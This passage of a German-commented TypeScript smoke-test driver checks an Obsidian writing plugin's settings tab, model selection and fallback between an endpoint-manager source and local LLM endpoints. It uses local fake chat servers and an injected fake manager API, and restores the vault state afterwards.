    // --- C9d vor C10: er wechselt die Quelle und braucht ein Panel mit Inhalt ---
    await pruefeTextfeldErreichbar(cdp);

    // --- B11b nach C3/C4/C8/C9d, vor C10: eigener dritter Lauf mit Quelle "Textfeld" — ab
    // hier haengt nichts Nachfolgendes mehr an einer zur Notiz passenden Session-Runde.
    await pruefeB11bFreetext(cdp);

    // --- C10 ganz zuletzt: er raeumt die Sitzung, alles danach saehe eine leere ---
    await pruefeZuruecksetzen(cdp);
  } finally {
    // Der Lauf hinterlaesst nichts im Vault: Notiz zurueck, Logbuch weg, Einstellung zurueck.
    await cdp.evaluate(`await app.vault.modify(app.vault.getAbstractFileByPath(${q(NOTE)}), ${q(vorher)}); return { ok: true };`).catch(() => null);
    await cdp.evaluate(`
      const f = app.vault.getAbstractFileByPath(${q(LOGBOOK_FOLDER)});
      if (f) await app.vault.delete(f, true);
      return { ok: true };
    `).catch(() => null);
    if (logbuchAn) await setPluginSetting(cdp, PLUGIN_ID, "logbookEnabled", false).catch(() => null);
    if (denkenAn) await stelleDenkenZurueck(cdp).catch(() => null);
    if (modellGeaendert) await cdp.evaluate(`const p = app.plugins.plugins[${q(PLUGIN_ID)}]; await p.llm.setModel(${q(modellVorwert)}); return { ok: true };`).catch(() => null);
  }
}

// --- M · LLM Endpoint Manager (optionale Fremd-Quelle, Task 5 Pilot) -------------------

/** Eigener Mini-HTTP-Server statt eines echten LLM-Servers oder des echten Manager-Plugins:
 *  M1-M3 pruefen die KONSUMENTEN-Seite (resolveEndpointSource/findEndpointManager in
 *  main.ts + settings-tab.ts), nicht den Manager selbst — der hat sein eigenes GUI-Smoke
 *  in llm-endpoint-manager/scripts/gui-smoke.ts (`startFakeEndpoint`, dort B1-B3). Diese
 *  Fassung beantwortet zusaetzlich POST /v1/chat/completions mit einem minimalen SSE-Strom,
 *  weil M2 einen echten Lauf braucht, nicht nur eine Erreichbarkeits-Probe.
 *
 *  Zweimal gebraucht (Fix-Runde M3-Nacharbeit, 2026-09-15): einmal als Manager-Endpunkt
 *  (M1/M2), einmal als lokaler Fallback-Endpunkt (M3) — deshalb `modelId` als Parameter statt
 *  fest verdrahtet, sonst waere ein Log-Eintrag nicht zuzuordnen, WELCHER Fake-Server eine
 *  Anfrage sah.
 *
 *  `lastModel()` (Review-Fund I5, Fix-Runde 3): bis dahin prueften M2/M3 nur `chatCalls() > 0`
 *  und DRUCKTEN einen erwarteten Modellnamen, ohne ihn wirklich zu pruefen — der Server hatte
 *  den Request-Body in der Hand und warf ihn weg. Der Body wird jetzt VOLLSTAENDIG eingesammelt
 *  (`req.on("data"/"end")`), BEVOR geantwortet wird — nicht nebenlaeufig dazu, sonst waere
 *  `lastModel()` ein Race gegen die eigene Antwort. */
interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null }
/** Duenne Huelle ueber den zentralen Stub (`startLlmStub`): die Pruefpunkte lesen weiter `chatCalls()`/`lastModel()`.
 *  `lastModel()` kommt aus dem Mitschnitt; der Stub liest den Body vollstaendig, bevor er antwortet (kein Race, Review-Fund I5). */
async function startFakeChatEndpoint(modelId: string): Promise<FakeChatEndpoint> {
  const stub = await startLlmStub({ models: [modelId], standard: { text: "ok", model: modelId } });
  return {
    url: stub.url,
    close: () => stub.stop(),
    chatCalls: () => stub.zaehler().chat,
    lastModel: () => (stub.letzte("chat")?.json as { model?: string } | null)?.model ?? null,
  };
}

/** Injiziert eine FAKE `llm-endpoint-manager`-API in den Renderer — der Brief erlaubt
 *  ausdruecklich „Fake-API oder echtes Manager-Plugin" fuer M1. `findEndpointManager()`
 *  prueft nur die FORM (version===1 + alle Methoden als Funktion), keine Herkunft; ein
 *  echtes Manager-Plugin-Repo muesste dafuer nicht gebaut und deployt werden.
 *
 *  `config.model` (Review-Fund I5/C1, Fix-Runde 3): der ECHTE Manager setzt in
 *  `ResolvedEndpoint.config.model` zusaetzlich zu `defaultModel` denselben Wert
 *  (`llm-endpoint-manager/src/core/reachability.ts:39-40`) — das war genau das Feld, das
 *  `main.ts:220` vor dem C1-Fix eine vom Nutzer getroffene Modellwahl ueberschreiben liess.
 *  Ohne dieses Feld haette der Fake den Fehler nicht reproduziert und M2b waere ohne Wirkung
 *  gruen gewesen.
 *
 *  Vorherigen Registry-Eintrag sichern statt loeschen (Review-Fund I6): ein `app.plugins.
 *  plugins[MANAGER_PLUGIN_ID]`-Objekt kann Methoden/Klasseninstanzen tragen, die eine
 *  CDP-Rundreise ueber Node nicht ueberlebt (JSON.stringify wirft Funktionen weg) — deshalb
 *  wird NICHT nach Node zurueckgereicht, sondern im Renderer selbst auf `window` geparkt und
 *  von `removeFakeManager()` dort wieder eingesetzt. Heute (Staging-Vault ohne echten
 *  Manager) folgenlos; sobald der echte Manager in diesem Vault deployt wird, verhindert das
 *  einen Smoke-Lauf, der dessen Registrierung fuer den Rest der Sitzung zerstoert. */
async function installFakeManager(cdp: Cdp, url: string): Promise<void> {
  await installZentralFakeManager(cdp, {
    pluginId: MANAGER_PLUGIN_ID,
    endpunkte: [{ id: "fake-mgr-ep", label: "Fake Manager Endpoint", url, models: [MANAGER_DEFAULT_MODEL], defaultModel: MANAGER_DEFAULT_MODEL, configModel: "default" }],
  });
}

/** Entfernt den zentralen Fake-Manager und stellt den vorgefundenen Slot wieder her (auch auf dem Abbruchpfad aufrufbar). */
async function removeFakeManager(cdp: Cdp): Promise<void> {
  await entferneFakeManager(cdp, { pluginId: MANAGER_PLUGIN_ID });
}

/** Settings-Stelle: Modal (< 1.13) oder eigenes Fenster (>= 1.13) — uebernommen aus
 *  llm-endpoint-manager/scripts/gui-smoke.ts (dortige Herkunft: anysource-sideloader,
 *  2026-09-15). Obsidian 1.13 macht aus den Einstellungen ein eigenes Fenster ohne
 *  `window.app`; DOM-Pruefungen laufen deshalb ueber `stelle`, Zustands-Pruefungen (Plugin-
 *  Settings) immer ueber die Workspace-Verbindung `cdp`. */
interface SettingsStelle { cdp: Cdp; eigenesFenster: boolean; el: (ausdruck: string) => string }
async function settingsStelle(cdp: Cdp, port: number): Promise<SettingsStelle | null> {
  const alsModal = await cdp.evaluate<boolean>(`return Boolean(document.querySelector(".modal.mod-settings"));`);
  if (alsModal) {
    return {
      cdp,
      eigenesFenster: false,
      el: (ausdruck) => `(() => { const root = document.querySelector(".modal.mod-settings"); if (!root) return null; return (${ausdruck}) ?? null; })()`,
    };
  }
  const fenster = await attachTo("settings", port, REPO_NAME);
  if (!fenster) return null;
  return {
    cdp: fenster,
    eigenesFenster: true,
    // NICHT `document` als root: `Node.textContent` liefert fuer ein Document-Node per Spec
    // IMMER `null` (nur Element-/Text-Nodes tragen es) — ein `root.textContent`-Ausdruck waere
    // damit strukturell blind, egal wie lange gewartet wird. Gemessen 2026-09-15 an M1/M3:
    // `document.querySelectorAll(...)` fand die echten Elemente (stelleCount stimmte), aber
    // `document.textContent` blieb "" (bodyLen 0) selbst bei vollstaendig gerendertem Tab —
    // der vermutete Timing-Flake war keiner. `document.body` traegt textContent wie erwartet.
    el: (ausdruck) => `(() => { const root = document.body; return (${ausdruck}) ?? null; })()`,
  };
}

/** Ein NOCH offenes Einstellungen-Fenster (>=1.13) aus einem vorherigen `openSettings()`
 *  ist derselbe CDP-Ziel-Eintrag wie ein frisches — `attachTo("settings", …)` kann dann das
 *  ALTE (schon geschlossene, inhaltslose) Fenster treffen statt des neuen. Gemessen
 *  2026-09-15: `app.setting.close()` schliesst zwar das Fenster, aber `/json/list` fuehrt es
 *  noch kurz weiter — deshalb wird hier auf sein Verschwinden GEWARTET, bevor neu geoeffnet
 *  wird, statt sich auf einen festen Sleep zu verlassen. Das Ziel traegt die URL "about:blank"
 *  (kein `app://obsidian.md/...` wie die Workspace-Seite).
 */
async function warteAufGeschlosseneSettings(port: number, timeoutMs = 3000): Promise<void> {
  const bis = Date.now() + timeoutMs;
  for (;;) {
    try {
      const liste = (await fetch(`http://127.0.0.1:${port}/json/list`).then((r) => r.json())) as Array<{ type: string; url: string; title: string }>;
      const offen = liste.some((t) => t.type === "page" && t.url === "about:blank" && t.title.includes(REPO_NAME));
      if (!offen) return;
    } catch { return; }
    if (Date.now() > bis) return;
    await new Promise((r) => setTimeout(r, 200));
  }
}

async function openSettings(cdp: Cdp, port: number): Promise<SettingsStelle> {
  // Defensiv IMMER erst schliessen (auch wenn nichts offen war — dann no-op): der Grund
  // steht im Kommentar von warteAufGeschlosseneSettings.
  await schliesseEinstellungen(cdp);
  await warteAufGeschlosseneSettings(port);
  await cdp.evaluate(`
    app.setting.open();
    await new Promise((r) => setTimeout(r, 500));
    app.setting.openTabById(${q(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 1000));
    return { ok: true };
  `);
  const stelle = await settingsStelle(cdp, port);
  if (!stelle) throw new Error("Kein Einstellungen-Fenster/Modal gefunden.");
  if (stelle.eigenesFenster) await requireVisible(stelle.cdp).catch(() => undefined);
  // Wartet zusaetzlich auf den Plugin-Namen im Tab-Body statt sich auf den festen Sleep oben
  // zu verlassen — billige Absicherung, seit der eigentliche Fehler (`document.textContent`
  // ist per Spec IMMER null, s. `settingsStelle`) behoben ist, kein Flake mehr bekannt.
  await pollUntil<{ ok: boolean }>(
    stelle.cdp,
    `return ${stelle.el(`root.textContent && root.textContent.includes(${q(t_pluginName())}) ? { ok: true } : null`)};`,
    5000,
    200,
  );
  return stelle;
}
/** "LingoTuner" — der Ueberschriften-Text der eigenen Settings-Gruppe, ohne den i18n-Import
 *  im Treiber zu ziehen (der laeuft im Renderer, nicht in Node). Fest verdrahtet, weil er
 *  hier nur als Existenz-Marker dient, nicht als gepruefter String. */
function t_pluginName(): string { return "LingoTuner"; }

async function closeSettings(cdp: Cdp, stelle: SettingsStelle): Promise<void> {
  if (stelle.eigenesFenster) stelle.cdp.close();
  else await schliesseEinstellungen(cdp);
}

async function stelleCount(stelle: SettingsStelle, selector: string): Promise<number> {
  const r = await stelle.cdp.evaluate<{ n: number | null }>(`return { n: ${stelle.el(`root.querySelectorAll(${q(selector)}).length`)} };`);
  return r.n ?? 0;
}

async function stelleText(stelle: SettingsStelle): Promise<string> {
  const r = await stelle.cdp.evaluate<{ t: string | null }>(`return { t: ${stelle.el(`root.textContent || ""`)} };`);
  return r.t ?? "";
}

const MANAGED_TEXT = ["Endpunkte kommen vom LLM Endpoint Manager", "Endpoints come from the LLM Endpoint Manager"];

/** H · Hilfe-Zeile (UI-STANDARD §8): die ERSTE Zeile des Settings-Tabs traegt einen Text-Knopf und
 *  den Icon-Knopf (`bug`, Tooltip als Name). Gemessen wird Position und Bedienung, nicht der
 *  Wortlaut — sprachfrei, damit der Punkt in einer EN- und einer DE-Instanz laeuft. */
async function pruefeHilfeZeile(cdp: Cdp, port: number): Promise<void> {
  console.log("\nH · Hilfe-Zeile in den Settings");
  let stelle: SettingsStelle | null = null;
  try {
    stelle = await openSettings(cdp, port);
    const hilfe = await stelle.cdp.evaluate<{ name: string; knoepfe: number; icon: string | null } | null>(
      `return ${stelle.el(`(() => {
        const erste = document.querySelector(".setting-item");
        if (!erste) return null;
        return {
          name: erste.querySelector(".setting-item-name")?.textContent?.trim() ?? "",
          knoepfe: erste.querySelectorAll("button").length,
          icon: erste.querySelector(".extra-setting-button")?.getAttribute("aria-label") ?? null,
        };
      })()`)};`,
    );
    record(
      "H1 Die Hilfe-Zeile steht als erste Zeile im Tab, mit Text-Knopf und Icon-Knopf",
      hilfe !== null && hilfe.name !== "" && hilfe.knoepfe === 1 && !!hilfe.icon,
      hilfe ? `erste Zeile „${hilfe.name}“ · Text-Knoepfe ${hilfe.knoepfe} · Icon „${hilfe.icon ?? "keiner"}“` : "kein Settings-DOM",
    );
  } catch (e) {
    record("H1 Die Hilfe-Zeile steht als erste Zeile im Tab, mit Text-Knopf und Icon-Knopf", false, `Fehler: ${(e as Error).message}`);
  } finally {
    if (stelle) await closeSettings(cdp, stelle);
  }
}

/** G1/G2: Das globale Modell ist abgeloest (Welle 17). Ein Altwert in der data.json steht nach dem Laden in der
 *  Endpunkt-Zeile, der Altschluessel ist aus der Datei verschwunden, die Einstellungen kennen weder eine Zeile
 *  „Model“ noch die Zeilenoption „global model“; die Modellwahl des Panels (`setModel`) schreibt die aktive Zeile,
 *  „Server waehlt“ leert sie. Gegenprobe: mit dem Build von vor Welle 17 sind beide Punkte rot. */
async function pruefeGlobalesModell(cdp: Cdp, port: number): Promise<void> {
  console.log("\nG · Globales Modell abgeloest");
  const NAME1 = "G1 Altwert wandert in die Zeile, kein globales Modell in den Einstellungen";
  const NAME2 = "G2 Panel-Modellwahl schreibt in die aktive Zeile, „Server waehlt“ leert sie";
  const ALTWERT = "smoke-altmodell";
  const pfad = `.obsidian/plugins/${PLUGIN_ID}/data.json`;
  const vor = await cdp.evaluate<{ roh: string | null }>(`return { roh: (await app.vault.adapter.exists(${q(pfad)})) ? await app.vault.adapter.read(${q(pfad)}) : null };`);
  let stelle: SettingsStelle | null = null;
  try {
    const roh = vor.roh === null ? {} : (JSON.parse(vor.roh) as Record<string, unknown>);
    const alt = { ...roh, endpoints: [{ url: "http://127.0.0.1:1234" }], model: ALTWERT };
    const r = await cdp.evaluate<{ zeilenModell: unknown; altschluessel: boolean }>(`
      await app.vault.adapter.write(${q(pfad)}, ${q(JSON.stringify(alt))});
      await app.plugins.disablePlugin(${q(PLUGIN_ID)});
      await app.plugins.enablePlugin(${q(PLUGIN_ID)});
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      const gespeichert = JSON.parse(await app.vault.adapter.read(${q(pfad)}));
      return { zeilenModell: p.settings.endpoints[0]?.model, altschluessel: "model" in gespeichert || "model" in p.settings };
    `);
    stelle = await openSettings(cdp, port);
    const namen = await stelle.cdp.evaluate<{ n: string[] | null }>(`return { n: ${stelle.el(`[...root.querySelectorAll(".setting-item-name")].map((x) => (x.textContent ?? "").trim())`)} };`);
    const text = await stelleText(stelle);
    const keineOption = !/global model/i.test(text);
    const keineZeile = !(namen.n ?? []).some((n) => /^model(l)?$/i.test(n));
    record(NAME1, r.zeilenModell === ALTWERT && !r.altschluessel && keineOption && keineZeile,
      `Zeilen-Modell „${String(r.zeilenModell)}“ (erwartet „${ALTWERT}“), Altschluessel ${r.altschluessel ? "noch da" : "weg"}, Option „global model“ ${keineOption ? "weg" : "noch da"}, Zeile „Model“ ${keineZeile ? "weg" : "noch da"}`);
    const panel = await cdp.evaluate<{ gewaehlt: unknown; inUse: string; geleert: unknown; inUseLeer: string }>(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      await p.llm.setModel("panel-wahl-smoke");
      const gewaehlt = p.settings.endpoints[0]?.model;
      const inUse = p.llm.modelInUse();
      await p.llm.setModel("");
      return { gewaehlt, inUse, geleert: p.settings.endpoints[0]?.model, inUseLeer: p.llm.modelInUse() };
    `);
    record(NAME2, panel.gewaehlt === "panel-wahl-smoke" && panel.inUse === "panel-wahl-smoke" && (panel.geleert ?? "") === "",
      `Zeile nach Wahl „${String(panel.gewaehlt)}“, modelInUse „${panel.inUse}“; nach „Server waehlt“ Zeile „${String(panel.geleert ?? "")}“, modelInUse „${panel.inUseLeer}“`);
  } catch (e) {
    record(NAME1, false, `Fehler: ${(e as Error).message}`);
  } finally {
    if (stelle) await closeSettings(cdp, stelle);
    await cdp.evaluate(`
      await app.vault.adapter.write(${q(pfad)}, ${q(vor.roh ?? "{}")});
      await app.plugins.disablePlugin(${q(PLUGIN_ID)});
      await app.plugins.enablePlugin(${q(PLUGIN_ID)});
      return { ok: true };
    `).catch(() => null);
  }
}

/** M1-M3 (Task-5-Brief): Manager an → Settings zeigen den Baustein statt der lokalen Liste,
 *  ein Lauf geht an den Manager-Endpunkt; Manager aus → beides faellt auf lokal zurueck.
 *  M2/M3-Laeufe nutzen `laufeTune` (bereits fuer Teil C vorhanden) — dieselbe Mutation
 *  (`.lt-run` klicken, auf `.lt-status` is-ok/is-error warten), nur mit anderer Quelle
 *  darunter. Kein eigener try/finally je Punkt: alles haengt an DERSELBEN Fake-Instanz
 *  (Server + injizierte API), ein einziger auesserer try/finally raeumt beides auf. */
async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
  console.log("\nM · LLM Endpoint Manager (optionale Fremd-Quelle)");
  let fake: FakeChatEndpoint | null = null;
  let localFake: FakeChatEndpoint | null = null;
  let stelle: SettingsStelle | null = null;
  // Muss zurueckgeschrieben werden, falls M3 die lokale Liste testweise umbiegt — main()
  // fuehrt nach pruefeManager() nur noch einen Skip-Marker und das Aufraeumen aus (Stand
  // 2026-09-15 in main() geprueft), aber ein Treiber, der die Vault-Settings anders verlaesst
  // als er sie vorfand, ist ein Rueckstand fuer den naechsten Lauf.
  let vorherEndpoints: unknown = null;
  const REST = [
    "M1 Settings zeigen den Manager statt der lokalen Liste",
    "M2 Lauf nutzt den Manager-Endpunkt und das Default-Modell",
    "M2b Manager-Lauf nutzt gewaehltes Modell, nicht den Endpunkt-Default (C1)",
    "M3 Manager aus → lokale Liste in Settings und im Lauf",
    "M4 Abgeschalteter Manager-Endpunkt: die Meldung nennt den Grund statt „kein Endpunkt“",
  ];
  try {
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    console.log(`  Fake-Manager-Endpunkt: ${fake.url}`);
    await installFakeManager(cdp, fake.url);

    // M1 — Settings zeigen den Manager-Baustein (Text + Import-Knopf), kein .okit-ep-row
    // (der Marker des lokalen Listen-Editors, siehe vendor/kit-obsidian/endpoint-list.ts).
    stelle = await openSettings(cdp, port);
    const body = await stelleText(stelle);
    const managed = MANAGED_TEXT.some((s) => body.includes(s));
    const localRows = await stelleCount(stelle, ".okit-ep-row");
    record(REST[0]!, managed && localRows === 0, `managed-Text ${managed ? "da" : "fehlt"}, ${localRows} lokale Endpunkt-Zeilen`);
    await closeSettings(cdp, stelle);
    stelle = null;

    // M2 — ein Lauf nutzt den Manager-Endpunkt (Fake-Server sieht POST /v1/chat/completions)
    // und das Default-Modell (kein choice.model gesetzt → modelOf() faellt auf defaultModel).
    // Review-Fund I5: geprueft wird jetzt das TATSAECHLICH empfangene Modell (`lastModel()`),
    // nicht nur die Aufrufzahl — vorher haette C1 (ep.model ueberschreibt activeModel) hier
    // still durchgehen koennen, weil der Fake den Body warf.
    const okM2 = await laufeTune(cdp);
    const calls = fake.chatCalls();
    const modellM2 = fake.lastModel();
    record(REST[1]!, okM2 && calls > 0 && modellM2 === MANAGER_DEFAULT_MODEL,
      okM2 ? `Fake-Server sah ${calls} POST /v1/chat/completions, Modell ${JSON.stringify(modellM2)} (erwartet ${JSON.stringify(MANAGER_DEFAULT_MODEL)})`
           : `Lauf lieferte kein Ergebnis (Status: ${(await text(cdp, ".lt-status")) ?? "?"}), Fake-Server-Aufrufe: ${calls}`);

    // M2b — Review-Fund C1: `ep.model` (im echten Manager == `defaultModel`, s.
    // `installFakeManager`-Kommentar) darf eine vom Nutzer im `choice.model` getroffene Wahl
    // NICHT ueberschreiben. Setzt `choice.model` auf einen Wert, der sich vom Default
    // unterscheidet, und prueft, dass GENAU DIESER beim Fake-Server ankommt — das ist der
    // eigentliche Beweis fuer den Fix, nicht nur "ein Lauf war gruen".
    const gewaehltesModell = `${MANAGER_DEFAULT_MODEL}-CHOICE`;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.choice = { ...p.settings.choice, model: ${q(gewaehltesModell)} };
      await p.saveSettings();
      await p.llm.resolve();
      return { ok: true };
    `);
    const okM2b = await laufeTune(cdp);
    const modellM2b = fake.lastModel();
    record(REST[2]!, okM2b && modellM2b === gewaehltesModell,
      okM2b ? `Fake-Server sah Modell ${JSON.stringify(modellM2b)}, erwartet ${JSON.stringify(gewaehltesModell)}`
            : `Lauf lieferte kein Ergebnis (Status: ${(await text(cdp, ".lt-status")) ?? "?"})`);
    // choice zuruecksetzen: sonst liest M3s LOKALER Lauf denselben choice.model (modelOf()
    // prueft choice VOR localModel, unabhaengig vom Manager) und sein lastModel()-Check faellt
    // auf ein falsches "erwartet" herein, das gar nicht der Grund waere.
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.choice = {};
      await p.saveSettings();
      return { ok: true };
    `);

    // M4 — Kit 0.60.0: `resolveEndpointSource` behaelt bei einer ausdruecklichen Wahl den Grund `disabled`, und `tune()` zeigt
    // den Kit-Text dazu. Vorher kam `no-endpoint` an und der Zweig fuer `secret-missing` war toter Code. Gemessen wird die Meldung,
    // die der Nutzer sieht (Notice), nicht der Wert der Aufloesung.
    // Nur der abgeschaltete Endpunkt im Manager: gaebe es einen zweiten, wuerde die verwaiste Wahl automatisch dorthin ausweichen
    // (Aufloesung mit Grund UND Config) und der Lauf ginge durch. Der Fake-Slot wird danach wieder wie bei M1–M3 eingebaut.
    await installZentralFakeManager(cdp, {
      pluginId: MANAGER_PLUGIN_ID,
      endpunkte: [{ id: "fake-mgr-off", label: "Fake Manager Disabled", url: fake.url, models: [MANAGER_DEFAULT_MODEL], defaultModel: MANAGER_DEFAULT_MODEL, configModel: "default", enabled: false }],
    });
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.choice = { endpointId: "fake-mgr-off" };
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `);
    const grund = await cdp.evaluate<{ reason: string | null; ok: boolean }>(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      const r = await p.llm.resolve();
      const t = await p.api.tune("Bitte kuerzen", { directness: 0, context: 0, social: 2, semantics: 0 });
      return { reason: r.reason ?? null, ok: t.ok };
    `);
    const meldungen = await notices(cdp);
    const textDisabled = "switched off in the LLM Endpoint Manager";
    record(REST[4]!, grund.reason === "disabled" && !grund.ok && meldungen.includes(textDisabled),
      `Aufloesung reason ${JSON.stringify(grund.reason)}, Lauf ok: ${grund.ok}, Notices ${JSON.stringify(meldungen.slice(0, 160))}`);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.choice = {};
      await p.saveSettings();
      return { ok: true };
    `);
    await installFakeManager(cdp, fake.url);
    await cdp.evaluate(`const p = app.plugins.plugins[${q(PLUGIN_ID)}]; p.llm.invalidate(); await p.llm.resolve(); return { ok: true };`);

    // M3 — Manager "deaktivieren" (Analog zu disablePlugin, s. removeFakeManager) → Settings
    // fallen auf die lokale Liste zurueck, ein Lauf nutzt wieder den lokalen Endpunkt.
    //
    // Der lokale Lauf haengt NICHT am echten LM-Studio-Server auf ENDPOINT (:1234) — das ist
    // dieselbe Umgebungssache, die C1 rot macht (Modelle gelistet, Chat-Aufruf trotzdem
    // abgelehnt), und ein M3 mit dieser Abhaengigkeit ist "nichts gemessen", nicht "geprueft"
    // (Review-Fund, Fix-Runde M3-Nacharbeit 2026-09-15). Stattdessen ein ZWEITER Fake-Server
    // (dieselbe Bauart wie fuer M1/M2, eigener Modellname) — die lokale Endpunkt-Liste zeigt
    // waehrend der Messung testweise auf ihn und wird danach zurueckgeschrieben, statt die
    // Vault-Fixture dauerhaft zu aendern.
    await removeFakeManager(cdp);
    stelle = await openSettings(cdp, port);
    const bodyNach = await stelleText(stelle);
    const managedNach = MANAGED_TEXT.some((s) => bodyNach.includes(s));
    const localRowsNach = await stelleCount(stelle, ".okit-ep-row");
    await closeSettings(cdp, stelle);
    stelle = null;
    const settingsZurueck = !managedNach && localRowsNach > 0;

    localFake = await startFakeChatEndpoint(LOCAL_FALLBACK_MODEL);
    console.log(`  Fake-Lokal-Endpunkt: ${localFake.url}`);
    vorherEndpoints = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints };`)).eps;
    // model auf dem Endpunkt-Eintrag selbst (nicht settings.model): das ist die lokale
    // Pro-Endpunkt-Ueberschreibung, die C1s Fix fuer den lokalen Pfad ausdruecklich WEITER
    // gewinnen laesst (\`this.endpointSource === "local" && ep.model ? ep.model : ...\`) —
    // ohne sie waere settings.model ("" im Fixture, "Server waehlt") das einzig Erwartbare,
    // und der Modell-Check unten haette nichts Sinnvolles zu pruefen.
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(localFake.url)}, model: ${q(LOCAL_FALLBACK_MODEL)} }];
      await p.saveSettings();
      // llm.invalidate(): die Verbindung merkt die lokale Aufloesung bis dahin — ohne die Invalidierung wuerde der naechste Lauf den
      // laengst gecachten ECHTEN :1234-Endpunkt aus dem allerersten onload() weiterverwenden,
      // die neue Liste bliebe wirkungslos.
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `);
    const okLokal = await laufeTune(cdp);
    const lokaleCalls = localFake.chatCalls();
    const modellLokal = localFake.lastModel();
    record(REST[3]!, settingsZurueck && okLokal && lokaleCalls > 0 && modellLokal === LOCAL_FALLBACK_MODEL,
      `managed-Text ${managedNach ? "noch da" : "weg"}, ${localRowsNach} lokale Zeilen, lokaler Lauf gegen Fake-Server ${okLokal ? "ok" : "fehlgeschlagen"} (${lokaleCalls} POST /v1/chat/completions, Modell ${JSON.stringify(modellLokal)}, erwartet ${JSON.stringify(LOCAL_FALLBACK_MODEL)})`);
  } catch (e) {
    for (const n of REST) {
      if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
    }
  } finally {
    if (stelle) await closeSettings(cdp, stelle);
    await removeFakeManager(cdp).catch(() => null);
    if (vorherEndpoints !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        if (!p) return { ok: false };
        p.settings.endpoints = ${JSON.stringify(vorherEndpoints)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        return { ok: true };
      `).catch(() => null);
    }
    if (fake) await fake.close().catch(() => undefined);
    if (localFake) await localFake.close().catch(() => undefined);
  }
}

const APPLE_ENDPOINT_ID = "fake-apple";
const APPLE_LABEL = "Apple Intelligence (on-device)";
const APPLE_SHORTCUT = "Smoke Apple LLM";
/** Kurz, damit der Timeout-Pfad (S5) in Sekunden laeuft — die Client-Frist richtet sich nach ihr (+10 s). */
const APPLE_SHORTCUT_TIMEOUT_MS = 3000;

/** Fake-Manager mit ZWEI Endpunkten: einem HTTP-Endpunkt und dem Apple-Endpunkt (Transport `shortcuts`), ueber den
 *  zentralen Fake-Manager. Der filtert `list(filter)` wie der echte Manager nach `filter.transports` mit Default `["http"]`
 *  (Spiegel von llm-endpoint-manager/scripts/gui-smoke.ts G2) — S1 misst genau das, damit der Fake nicht still alles
 *  liefert und S2 gruen wird, ohne dass das Opt-in je gebraucht wurde (CORE-TEST-12). */
async function installAppleManager(cdp: Cdp, httpUrl: string): Promise<void> {
  await installZentralFakeManager(cdp, {
    pluginId: MANAGER_PLUGIN_ID,
    endpunkte: [
      { id: "fake-http", label: "Fake HTTP Endpoint", url: httpUrl, models: [MANAGER_DEFAULT_MODEL], defaultModel: MANAGER_DEFAULT_MODEL, configModel: "default" },
      { id: APPLE_ENDPOINT_ID, label: APPLE_LABEL, url: "apple-shortcuts://on-device", transport: "shortcuts", shortcut: { name: APPLE_SHORTCUT, timeoutMs: APPLE_SHORTCUT_TIMEOUT_MS } },
    ],
  });
}

/** S1–S5 · Apple-Intelligence-Endpunkt (Welle 14): Auswahl im Baustein, Transportwahl, Kurzbefehl-URL,
 *  Fehlerpfad. Ein echter Rundlauf (Kurzbefehle-App antwortet) ist nur am Geraet moeglich — ehrliche
 *  Grenze, kein Pruefpunkt; `window.open` ist gestubbt, damit die Zweitinstanz die App nie oeffnet. */
async function pruefeApple(cdp: Cdp, port: number): Promise<void> {
  console.log("\nS · Apple-Intelligence-Endpunkt (Kurzbefehl-Transport)");
  const NAMEN = [
    "S1 Fake-Manager liefert den Apple-Endpunkt nur bei Opt-in",
    "S2 Dropdown zeigt „Apple Intelligence (on-device)“",
    "S3 Wahl → Quelle traegt transport shortcuts",
    "S4 Lauf oeffnet die shortcuts://-URL mit dem gefalteten Prompt",
    "S5 Zeitueberschreitung des Kurzbefehls zeigt die Kurzbefehl-Meldung",
  ];
  let fake: FakeChatEndpoint | null = null;
  let stelle: SettingsStelle | null = null;
  let stubGesetzt = false;
  try {
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    await installAppleManager(cdp, fake.url);

    const listen = await cdp.evaluate<{ ohne: string[]; mit: string[] }>(`
      const api = app.plugins.plugins[${q(MANAGER_PLUGIN_ID)}].api;
      return { ohne: api.list({ capability: "chat" }).map((e) => e.id), mit: api.list({ capability: "chat", transports: ["http", "shortcuts"] }).map((e) => e.id) };
    `);
    record(NAMEN[0]!, listen.ohne.length === 1 && !listen.ohne.includes(APPLE_ENDPOINT_ID) && listen.mit.includes(APPLE_ENDPOINT_ID),
      `ohne Opt-in ${JSON.stringify(listen.ohne)}, mit Opt-in ${JSON.stringify(listen.mit)}`);

    // S2 — der Baustein bietet den Apple-Endpunkt an (transports-Option im Settings-Tab)
    stelle = await openSettings(cdp, port);
    const optionen = await stelle.cdp.evaluate<{ o: string[] | null }>(
      `return { o: ${stelle.el(`[...root.querySelectorAll("select option")].map((o) => o.textContent || "")`)} };`);
    const hatApple = (optionen.o ?? []).some((o) => o.includes(APPLE_LABEL));
    record(NAMEN[1]!, hatApple, `Optionen: ${JSON.stringify(optionen.o ?? [])}`);

    // S3 — Wahl wie ein Nutzer: Dropdown setzen, change ausloesen
    await stelle.cdp.evaluate(`
      return ${stelle.el(`(() => {
        const sel = [...root.querySelectorAll("select")].find((s) => [...s.options].some((o) => (o.textContent || "").includes(${q(APPLE_LABEL)})));
        if (!sel) return { ok: false };
